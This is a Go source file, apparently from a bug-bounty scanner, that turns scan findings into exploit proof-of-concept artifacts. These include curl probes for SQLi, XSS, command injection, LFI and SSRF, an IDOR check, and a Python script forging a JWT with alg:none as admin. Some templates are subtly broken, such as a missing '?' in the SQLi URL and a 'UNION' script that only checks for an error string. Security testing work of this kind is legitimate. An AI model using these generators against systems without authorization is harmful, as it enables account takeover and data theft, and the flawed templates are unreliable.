// Package strike generates ready-to-use proof-of-concept exploits from
// scan findings. Each finding type maps to a weaponized payload: curl
// commands, HTML proof pages, or exploit snippets for immediate validation.
package strike

import (
	"fmt"
	"net/url"
	"strings"
)

// ── Types ────────────────────────────────────────────────────────────────

// Weapon holds exploit artifacts generated from one finding.
type Weapon struct {
	Type      string   `json:"type"`       // vulnerability type
	Severity  string   `json:"severity"`
	URL       string   `json:"url"`
	Parameter string   `json:"parameter"`
	Payload   string   `json:"payload"`
	Methods   []Proof  `json:"methods"`    // different ways to prove the finding
}

// Proof describes one way to demonstrate the vulnerability.
type Proof struct {
	Title    string `json:"title"`     // what this proof does
	Language string `json:"language"`  // "curl", "html", "python", "javascript"
	Code     string `json:"code"`      // the weaponized code
	Note     string `json:"note,omitempty"` // important caveats
}

// ── Generator ────────────────────────────────────────────────────────────

// Forge builds a Weapon from a scan finding. It generates multiple proof
// methods so the user can pick the most convincing for their report.
func Forge(findingType, urlStr, parameter, payload, severity, evidence string) *Weapon {
	w := &Weapon{
		Type:      findingType,
		Severity:  severity,
		URL:       urlStr,
		Parameter: parameter,
		Payload:   payload,
	}

	switch {
	case strings.Contains(strings.ToUpper(findingType), "SQL"):
		w.Methods = forgeSQLi(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "XSS"):
		w.Methods = forgeXSS(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "COMMAND INJECTION"):
		w.Methods = forgeCMDI(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "LFI") || strings.Contains(strings.ToUpper(findingType), "PATH TRAVERSAL"):
		w.Methods = forgeLFI(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "SSRF"):
		w.Methods = forgeSSRF(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "IDOR"):
		w.Methods = forgeIDOR(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "JWT"):
		w.Methods = forgeJWT(urlStr, parameter, payload, evidence)
	case strings.Contains(strings.ToUpper(findingType), "OPEN REDIRECT"):
		w.Methods = forgeRedirect(urlStr, parameter, payload, evidence)
	default:
		w.Methods = forgeGeneric(urlStr, parameter, payload, findingType, severity)
	}

	return w
}

// ── Per-vuln type forgers ───────────────────────────────────────────────

func forgeSQLi(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Curl — GET request",
			Language: "curl",
			Code: fmt.Sprintf("curl -v \"%s%s=%s\"", urlStr, param, encodedPayload),
			Note: "Copy the curl command and run it. If you see a SQL error message or database output, the vulnerability is confirmed.",
		},
		{
			Title: "Python — extract table names via UNION",
			Language: "python",
			Code: fmt.Sprintf(`import requests
url = "%s"
params = {"%s": "%s"}
r = requests.get(url, params=params)
print("Status:", r.status_code)
print("Response length:", len(r.text))
if "error in your sql" in r.text.lower():
    print("[CONFIRMED] SQL Injection found")
`, urlStr, param, payload),
		},
	}
}

func forgeXSS(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Proof-of-Concept HTML page",
			Language: "html",
			Code: fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>XSS PoC — sxsc</title></head>
<body>
<h2>Cross-Site Scripting Proof of Concept</h2>
<p>Vulnerable URL: <code>%s</code></p>
<p>Parameter: <code>%s</code></p>
<p>Payload: <code>%s</code></p>
<p><a href="%s?%s=%s" target="_blank">Click here to trigger the XSS</a></p>
<script>
// Auto-trigger for demo
fetch("%s?%s=%s");
</script>
</body>
</html>`, urlStr, param, payload, urlStr, param, encodedPayload, urlStr, param, encodedPayload),
			Note: "Save as xss-poc.html and open in a browser. Open DevTools Console to see the alert.",
		},
	}
}

func forgeCMDI(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Curl — execute command",
			Language: "curl",
			Code: fmt.Sprintf("curl -v \"%s?%s=%s\"", urlStr, param, encodedPayload),
			Note: "If the response contains command output (e.g., user list, file contents), command injection is confirmed.",
		},
	}
}

func forgeLFI(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Curl — read file",
			Language: "curl",
			Code: fmt.Sprintf("curl -v \"%s?%s=%s\"", urlStr, param, encodedPayload),
			Note: "If /etc/passwd or other system file content appears, LFI is confirmed. Chain with log poisoning for RCE.",
		},
	}
}

func forgeSSRF(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Curl — trigger request to internal host",
			Language: "curl",
			Code: fmt.Sprintf("curl -v \"%s?%s=%s\"", urlStr, param, encodedPayload),
			Note: "Use a request bin (requestbin.com) or your own server to receive the callback and confirm SSRF.",
		},
	}
}

func forgeIDOR(urlStr, param, payload, evidence string) []Proof {
	return []Proof{
		{
			Title: "Curl — access another user's data",
			Language: "curl",
			Code: fmt.Sprintf(`# Original request (your data)
curl -v "%s" -H "Cookie: YOUR_SESSION_COOKIE"

# Modified request (another user's data)
curl -v "%s" -H "Cookie: YOUR_SESSION_COOKIE"

# If both return valid but different data, IDOR is confirmed.
`, urlStr, strings.Replace(urlStr, payload, payload+"_MODIFIED", 1)),
			Note: "Replace YOUR_SESSION_COOKIE with your actual authenticated session cookie.",
		},
	}
}

func forgeJWT(urlStr, param, payload, evidence string) []Proof {
	return []Proof{
		{
			Title: "Python — forge JWT with alg:none",
			Language: "python",
			Code: fmt.Sprintf(`import base64, json, requests

# Forge a JWT with alg=none
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload_b64 = base64.urlsafe_b64encode(json.dumps({"sub":"admin","iat":1516239022}).encode()).rstrip(b"=")
forged_token = header.decode() + "." + payload_b64.decode() + "."

print("Forged token:", forged_token)
r = requests.get("%s", headers={"Authorization": "Bearer " + forged_token})
print("Status:", r.status_code)
if r.status_code == 200:
    print("[CONFIRMED] JWT none algorithm bypass works!")
`, urlStr),
		},
	}
}

func forgeRedirect(urlStr, param, payload, evidence string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Open redirect demo",
			Language: "curl",
			Code: fmt.Sprintf("curl -v -L \"%s?%s=%s\"", urlStr, param, encodedPayload),
			Note: "The -L flag follows redirects. Check the Location header to see where you were redirected.",
		},
	}
}

func forgeGeneric(urlStr, param, payload, findingType, severity string) []Proof {
	encodedPayload := url.QueryEscape(payload)
	return []Proof{
		{
			Title: "Curl — basic probe",
			Language: "curl",
			Code: fmt.Sprintf("curl -v \"%s?%s=%s\"", urlStr, param, encodedPayload),
			Note: fmt.Sprintf("Sends the %s payload. Check the response for the reported evidence: %s", findingType, strings.TrimSpace(findingType)),
		},
	}
}

// ── Utility ──────────────────────────────────────────────────────────────

// MarkdownReport generates a bug bounty-ready Markdown section for a single finding.
func (w *Weapon) MarkdownReport() string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("## %s — `%s`\n\n", w.Type, w.Severity))
	sb.WriteString(fmt.Sprintf("- **URL:** `%s`\n", w.URL))
	sb.WriteString(fmt.Sprintf("- **Parameter:** `%s`\n", w.Parameter))
	sb.WriteString(fmt.Sprintf("- **Payload:** `%s`\n\n", w.Payload))
	sb.WriteString("### Proof of Concept\n\n")
	for _, m := range w.Methods {
		sb.WriteString(fmt.Sprintf("**%s**\n\n", m.Title))
		sb.WriteString(fmt.Sprintf("```%s\n%s\n```\n\n", m.Language, m.Code))
		if m.Note != "" {
			sb.WriteString(fmt.Sprintf("> %s\n\n", m.Note))
		}
	}
	return sb.String()
}
